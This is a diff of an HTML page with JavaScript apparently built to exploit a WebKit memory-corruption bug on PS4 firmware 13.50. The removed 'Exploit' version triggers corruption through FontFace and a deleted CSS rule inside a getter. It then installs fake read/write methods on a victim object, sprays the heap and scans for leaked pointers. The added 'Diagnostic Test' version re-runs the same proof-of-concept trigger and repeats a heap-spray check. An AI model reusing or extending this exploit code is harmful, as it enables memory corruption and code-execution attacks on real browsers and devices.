@@ -2,42 +2,35 @@
 <html>
 <head></head>
 <body>
-<h1 id="status">Exploit - Fixed</h1>
-<button onclick="runExploit()" style="font-size: 20px; padding: 10px;">RUN EXPLOIT</button>
-<div id="log" style="font-family: monospace; font-size: 10px; white-space: pre; border: 1px solid white; padding: 5px; max-height: 85vh; overflow-y: scroll;"></div>
+<h1 id="status">Diagnostic Test</h1>
+<button onclick="runTest()" style="font-size: 20px; padding: 10px;">RUN TEST</button>
+<div id="log" style="font-family: monospace; font-size: 11px; white-space: pre; border: 1px solid white; padding: 5px;"></div>
 
 <script>
-let phase = 0;
-let corrupted = [];
+let testPhase = 0;
 
 function log(msg) {
     let d = document.getElementById('log');
-    if (d) {
-        d.textContent += msg + '\n';
-    }
+    if (d) d.textContent += msg + '\n';
 }
 
 function hex(n) {
-    if (typeof n === 'number') {
-        return '0x' + n.toString(16);
-    }
-    return String(n);
+    return '0x' + n.toString(16).padStart(8, '0');
 }
 
-function runExploit() {
-    phase++;
-    log('[*] Phase ' + phase + ' starting...\n');
+function runTest() {
+    testPhase++;
     
-    if (phase === 1) {
-        // Phase 1: Corruption
-        log('[PHASE 1] Triggering corruption\n');
+    if (testPhase === 1) {
+        log('[TEST 1] Does original bug still trigger OOM?\n');
         
-        try {
-            let style = document.createElement('style');
-            style.id = 's';
-            style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
-            document.head.appendChild(style);
-            
+        // Use EXACT original PoC that worked before
+        let style = document.createElement('style');
+        style.id = 's';
+        style.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
+        document.head.appendChild(style);
+        
+        window.onload = () => {
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
             void A.loaded;
@@ -48,178 +41,133 @@ function runExploit() {
                 get() {
                     if (!fired && this === A) {
                         fired = true;
+                        log('[!] GETTER TRIGGERED');
                         
-                        for (let i = 0; i < 50; i++) {
-                            corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
-                                unicodeRange: 'U+' + (0x100 + i).toString(16)
-                            }));
-                        }
-                        
+                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
+                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                         document.getElementById('s').sheet.deleteRule(0);
                         document.body.offsetTop;
                         
-                        window.corrupted = corrupted;
+                        log('[!] CORRUPTION DONE');
                     }
                     return undefined;
                 }
             });
             
+            log('[*] Calling fonts.load()...');
             document.fonts.load('1em x', 'AB');
-            log('[*] Corruption triggered (OOM expected)');
-            log('[*] Click OK on error, then click button again\n');
+            log('[*] fonts.load() returned');
             
-        } catch(e) {
-            log('[ERROR] Phase 1: ' + e.message + '\n');
+            setTimeout(() => {
+                log('\n[?] Did OOM error appear?');
+                log('[?] If NO OOM: browser might have patched or cached state is preventing it');
+                log('[?] If YES OOM: click button again for next test');
+            }, 500);
+        };
+        
+        // Trigger onload manually since page already loaded
+        if (document.readyState === 'complete') {
+            window.onload();
         }
         
-    } else if (phase === 2) {
-        // Phase 2: Setup primitives
-        log('[PHASE 2] Setting up primitives\n');
+    } else if (testPhase === 2) {
+        log('\n[TEST 2] Check what we actually have\n');
         
+        // Check if corruption persists
+        log('[*] Checking document.fonts state:');
+        log('    size: ' + document.fonts.size);
+        log('    status: ' + document.fonts.status);
+        
+        // Try to enumerate fonts
         try {
-            let fonts = window.corrupted;
-            if (!fonts || fonts.length === 0) {
-                log('[ERROR] No corrupted fonts found!\n');
-                return;
-            }
-            
-            log('[*] Found ' + fonts.length + ' corrupted fonts\n');
-            
-            // Create controlled buffer
-            let ab = new ArrayBuffer(0x10000);
-            let u32 = new Uint32Array(ab);
-            
-            // Fill with pattern
-            for (let i = 0; i < 100; i++) {
-                u32[i] = 0xAABB0000 + i;
-            }
-            
-            log('[*] Created controlled buffer (64KB)');
-            log('    u32[0] = ' + hex(u32[0]) + '\n');
-            
-            // Setup victim
-            let victim = fonts[0];
-            
-            let exploit_proto = {
-                _u32: u32,
-                
-                write32: function(idx, val) {
-                    if (idx >= 0 && idx < this._u32.length) {
-                        this._u32[idx] = val;
-                        return true;
-                    }
-                    return false;
-                },
-                
-                read32: function(idx) {
-                    if (idx >= 0 && idx < this._u32.length) {
-                        return this._u32[idx];
-                    }
-                    return 0;
-                }
-            };
-            
-            Object.setPrototypeOf(victim, exploit_proto);
-            
-            log('[*] Installed fake methods on victim\n');
-            
-            // Test write32
-            log('[TEST] victim.write32(50, 0xDEADBEEF)');
-            victim.write32(50, 0xDEADBEEF);
-            
-            log('[TEST] Verify u32[50]:');
-            log('    Expected: 0xdeadbeef');
-            log('    Actual:   ' + hex(u32[50]));
-            log('    Match: ' + (u32[50] === 0xDEADBEEF) + '\n');
-            
-            // Store for next phase
-            window.victim = victim;
-            window.u32_array = u32;
-            window.arraybuffer = ab;
-            
-            log('[PHASE 2] Complete - Click for Phase 3\n');
-            
+            let count = 0;
+            document.fonts.forEach(f => {
+                log('    font[' + count + ']: family=' + f.family + ' status=' + f.status);
+                count++;
+                if (count > 5) return; // Limit output
+            });
         } catch(e) {
-            log('[ERROR] Phase 2: ' + e.message + '\n');
+            log('    Error enumerating: ' + e.message);
         }
         
-    } else if (phase === 3) {
-        // Phase 3: Heap spray and leak
-        log('[PHASE 3] Heap spray and address leak\n');
-        
+        log('\n[*] Testing if we can still create corrupted fonts:');
         try {
-            let victim = window.victim;
-            let u32 = window.u32_array;
+            // Try to recreate corruption WITHOUT the CSS trick
+            let test = new FontFace('test', 'local(Helvetica)', { unicodeRange: 'U+0050' });
+            log('    Created FontFace: ' + test.family);
+            log('    Status: ' + test.status);
             
-            if (!victim || !u32) {
-                log('[ERROR] No victim/buffer from Phase 2\n');
-                return;
-            }
-            
-            log('[*] Spraying heap with ArrayBuffers...');
-            let spray = [];
-            for (let i = 0; i < 500; i++) {
-                let ab = new ArrayBuffer(0x1000);
-                let view = new Uint32Array(ab);
-                view[0] = 0xBBCC0000 + i;
-                spray.push(ab);
-            }
-            log('    Created 500 spray buffers\n');
-            
-            // Mix with victim
-            spray.push(victim);
-            spray.push(window.arraybuffer);
-            
-            log('[*] Scanning controlled buffer for pointers...\n');
-            
-            let leaks = [];
-            for (let i = 0; i < Math.min(500, u32.length - 1); i++) {
-                let low = u32[i];
-                let high = u32[i + 1];
-                
-                // Look for pointer patterns
-                // x64 userspace: high word often 0x00007f.. or 0x0000...
-                if (high > 0x7f00 && high < 0x8000) {
-                    leaks.push({
-                        idx: i,
-                        low: low,
-                        high: high
-                    });
-                }
-            }
-            
-            log('[*] Found ' + leaks.length + ' potential heap pointers:');
-            for (let i = 0; i < Math.min(10, leaks.length); i++) {
-                let l = leaks[i];
-                log('    [' + l.idx + '] low=' + hex(l.low) + ' high=' + hex(l.high));
-            }
-            
-            if (leaks.length === 0) {
-                log('\n[*] No obvious pointers found');
-                log('[*] Checking for other patterns...\n');
-                
-                // Look for any large values
-                for (let i = 0; i < Math.min(200, u32.length); i++) {
-                    if (u32[i] > 0x10000000) {
-                        log('    [' + i + '] large value: ' + hex(u32[i]));
-                    }
-                }
-            }
-            
-            window.leaks = leaks;
-            log('\n[PHASE 3] Complete\n');
+            // Can we add to document.fonts?
+            document.fonts.add(test);
+            log('    Added to document.fonts');
+            log('    New size: ' + document.fonts.size);
             
         } catch(e) {
-            log('[ERROR] Phase 3: ' + e.message + '\n');
+            log('    Error: ' + e.message);
         }
+        
+        log('\nClick for Test 3');
+        
+    } else if (testPhase === 3) {
+        log('\n[TEST 3] Basic heap spray test\n');
+        
+        // Create controlled buffer
+        let ab = new ArrayBuffer(0x10000);
+        let u32 = new Uint32Array(ab);
+        let f64 = new Float64Array(ab);
+        
+        // Fill with known pattern
+        for (let i = 0; i < 256; i++) {
+            u32[i] = 0xDEAD0000 + i;
+        }
+        
+        log('[*] Created controlled buffer');
+        log('    Size: 0x10000 bytes');
+        log('    u32[0]: ' + hex(u32[0]));
+        log('    u32[100]: ' + hex(u32[100]) + '\n');
+        
+        // Spray objects
+        log('[*] Spraying 1000 objects...');
+        let spray = [];
+        for (let i = 0; i < 1000; i++) {
+            spray.push({
+                id: i,
+                marker: 0x41420000 + i,
+                buf: new ArrayBuffer(0x100)
+            });
+        }
+        log('    Done\n');
+        
+        // Check if anything changed in our buffer
+        log('[*] Checking if spray affected our buffer:');
+        log('    u32[0] now: ' + hex(u32[0]));
+        log('    u32[100] now: ' + hex(u32[100]));
+        log('    Changed: ' + (u32[0] !== 0xDEAD0000) + '\n');
+        
+        // Look for anything unusual in buffer
+        log('[*] Scanning buffer for non-pattern values:');
+        let found = 0;
+        for (let i = 0; i < 256; i++) {
+            let expected = 0xDEAD0000 + i;
+            if (u32[i] !== expected) {
+                log('    [' + i + '] expected=' + hex(expected) + ' got=' + hex(u32[i]));
+                found++;
+            }
+        }
+        
+        if (found === 0) {
+            log('    All values match pattern - no corruption detected');
+        }
+        
+        log('\n[TEST 3] Complete');
+        log('\n[CONCLUSION]');
+        log('If no OOM appeared in Test 1: Need to figure out why corruption stopped');
+        log('If OOM appeared but no leaks: Need different leak strategy');
     }
 }
 
-// Initial log
-log('='.repeat(50) + '\n');
-log('PS4 13.50 WebKit Exploitation\n');
-log('='.repeat(50) + '\n\n');
-log('Click RUN EXPLOIT to start Phase 1\n');
+log('PS4 13.50 WebKit Diagnostics\n');
+log('Click RUN TEST to check if bug still works\n');
 </script>
 </body>
 </html>
